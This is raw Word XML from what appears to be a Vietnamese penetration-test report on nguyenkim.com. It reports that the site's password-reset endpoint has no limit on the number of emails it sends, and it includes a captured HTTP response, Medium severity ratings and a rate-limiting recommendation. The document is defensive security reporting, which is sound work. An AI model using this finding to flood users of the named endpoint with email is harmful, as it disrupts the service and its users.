              <w:t>Set-Cookie: message_6a0c57a76500925fc3676e697aca892a=%7B%22type%22%3A%22N%22%2C%22title%22%3A%22Th%5Cu00f4ng+tin%22%2C%22message%22%3A%22M%5Cu1ed9t+email+h%5Cu01b0%5Cu1edbng+d%5Cu1eabn+l%5Cu1ea5y+l%5Cu1ea1i+m%5Cu1eadt+kh%5Cu1ea9u+%5Cu0111%5Cu00e3+%5Cu0111%5Cu01b0%5Cu1ee3c+g%5Cu1eedi+%5Cu0111%5Cu1ebfn+h%5Cu00f2m+th%5Cu01b0+c%5Cu1ee7a+b%5Cu1ea1n.%22%2C%22message_state%22%3A%22I%22%7D; expires=Wed, 19-May-2021 20:20:36 GMT; Max-Age=43200; path=/</w:t>
              <w:br/>
              <w:t>Access-Control-Allow-Origin: *</w:t>
              <w:br/>
              <w:t>Set-Cookie: SRVID=w7|YKTKU|YKSXF; path=/</w:t>
              <w:br/>
              <w:t>Server: NguyenKim</w:t>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t/>
              <w:br/>
              <w:t>{"current_url":"https:\/\/www.nguyenkim.com\/","notifications":[{"type":"S","title":"Thành công","message":"Đường dẫn thay đổi mật khẩu được gửi vào email của bạn!","message_state":"","new":true,"extra":"","init_message":false}]}"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5942488B" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="512"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="15352328" w14:textId="5624B73D" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>Image-2021-05-19 15:23:41</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00A20BDD">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="329271DA" w14:textId="393E6FC1" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>"N/A"</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0048674E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
          <w:p w14:paraId="37267424" w14:textId="207E2352" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidR="002B280E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="001B0A1E">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5EE5D090" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809"/>
    <w:p w14:paraId="317F1CE0" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRDefault="00CC4809" w:rsidP="00CC4809">
      <w:pPr>
        <w:sectPr w:rsidR="00CC4809" w:rsidSect="00CC4809">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11909" w:h="16834" w:code="9"/>
          <w:pgMar w:top="1134" w:right="1134" w:bottom="1134" w:left="1418" w:header="680" w:footer="783" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="413980EE" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00B25F11" w:rsidRDefault="00CC4809" w:rsidP="00760616">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r w:rsidRPr="00B25F11">
        <w:t>Test number of times a function can be used limits (OTG-BUSLOGIC-005)</w:t>
      </w:r>
      <w:r w:rsidR="000316BB">
        <w:t/>
      </w:r>
      <w:r w:rsidRPr="00B25F11">
        <w:t/>
      </w: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395"/>
        <w:gridCol w:w="2695"/>
        <w:gridCol w:w="1868"/>
        <w:gridCol w:w="2369"/>
      </w:tblGrid>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5965EA99" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="530"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="56140739" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY INFORMATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5F079BF3" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:trPr>
          <w:trHeight w:val="350"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="35E5E811" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:rStyle w:val="PlaceholderText"/>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFFFFF" w:themeColor="background1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>CATEGORY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="5004B103" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>[[Medium.Vuln.Category_Vuln]:unprocessed]</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="01CBA2BA" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="41F6ADA4" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>DESCRIPTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2F7049CA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Chức năng quên mật khẩu không giới hạn số lần gửi mail, kẻ tấn công có thể phát triển một công cụ để thực hiện spam mail liên tục làm ảnh hưởng tới hệ thống và người dùng</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="0050547A">
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3C78CBA9" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7C2E72F6" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>SEVERITY</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="1CFD4CD2" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="4D9638CE" w14:textId="77777777" w:rsidTr="00CC4809">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0129F527" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>IMPACT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2695" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="41AE9C14" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1868" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="62A68CF9" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>LIKELIHOOD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2369" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="2A7B0C5E" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="76B12BA1" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="170E1BB1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>RECOMMENDATION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="13491B83" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Giới hạn số lần gửi mail bằng thời gian</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00AE3A4C">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5EF1BC48" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="05E3C4CA" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>REFERENCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0E013242" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>N/A</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00F635D8">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3E098A7F" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9327" w:type="dxa"/>
            <w:gridSpan w:val="4"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B0F0"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="7AD0F9BC" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>VULNERABILITY DETAIL</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="3A8534DA" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="0F1304E1" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>FUNCTION</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="67AEDDF0" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>Quên mật khẩu</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
            <w:r w:rsidRPr="00E41FA9">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t/>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00CC4809" w:rsidRPr="00013A35" w14:paraId="5B995E53" w14:textId="77777777" w:rsidTr="00AA4467">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2395" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="234961EB" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00013A35">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:color w:val="000000"/>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>AFFECTED URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="6932" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:vAlign w:val="center"/>
          </w:tcPr>
          <w:p w14:paraId="513E3C3A" w14:textId="77777777" w:rsidR="00CC4809" w:rsidRPr="00013A35" w:rsidRDefault="00CC4809" w:rsidP="00AA4467">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00CF70A7">
              <w:rPr>
                <w:sz w:val="20"/>
                <w:szCs w:val="20"/>
              </w:rPr>
              <w:t>https://www.nguyenkim.com:443/index.php?dispatch=auth.recover_password</w:t>
            </w:r>
            <w:r w:rsidR="000316BB">
              <w:rPr>
                <w:sz w:val="20"/>
